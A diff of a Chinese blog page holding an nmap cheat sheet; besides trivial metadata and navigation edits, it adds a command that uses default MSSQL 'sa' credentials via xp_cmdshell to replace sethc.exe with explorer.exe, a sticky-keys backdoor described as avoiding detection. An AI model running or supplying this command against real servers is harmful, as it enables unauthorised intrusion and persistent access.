@@ -26,7 +26,7 @@
 - Operating system version detection
 - Hardware(MAC) address dection
 - Service version dete">
-<meta property="og:updated_time" content="2016-05-01T13:45:37.975Z">
+<meta property="og:updated_time" content="2016-05-03T04:17:36.618Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Nmap 手册">
 <meta name="twitter:description" content="0x00: 说明nmap 速查手册, 总结常用用法.
@@ -101,7 +101,7 @@
 						<li>Links</li>
 						
 						
-						<li>Über</li>
+						<li>About</li>
 						
 					</ul>
 				</div>
@@ -743,7 +743,10 @@
 <p><br></p>
 <h2 id="0x04-Nmap-总结常用参数"><a href="#0x04-Nmap-总结常用参数" class="headerlink" title="0x04: Nmap 总结常用参数"></a>0x04: Nmap 总结常用参数</h2><h6 id="common-use"><a href="#common-use" class="headerlink" title="common use"></a>common use</h6><ul>
 <li>扫描常见漏洞, OS识别, 版本探测</li>
-<li>nmap -sS -A -v -T3 -Pn –script=vuln Target</li>
+<li><p>nmap -sS -A -v -T3 -Pn –script=vuln Target</p>
+</li>
+<li><p>利用mssql弱口令, 直接加后门, 避免暴露.<br>nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”copy c:\WINDOWS\explorer.exe c:\WINDOWS\system32\sethc.exe /y” target</p>
+</li>
 </ul>
 <p><br></p>
 <h2 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05: Reference"></a>0x05: Reference</h2><p>原文<br><a href="http://highon.coffee/docs/nmap/" target="_blank" rel="external">http://highon.coffee/docs/nmap/</a><br><a href="http://drops.wooyun.org/tips/4333/" target="_blank" rel="external">http://drops.wooyun.org/tips/4333/</a><br><br><br>有问题找男人<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man nmap</span><br></pre></td></tr></table></figure></p>
@@ -771,6 +774,15 @@
   
     
 <nav id="article-nav">
+  
+    <a href="/2016/05/02/Python-列表解析/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Python 列表解析
+        
+      </div>
+    </a>
   
   
     <a href="/2016/04/29/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
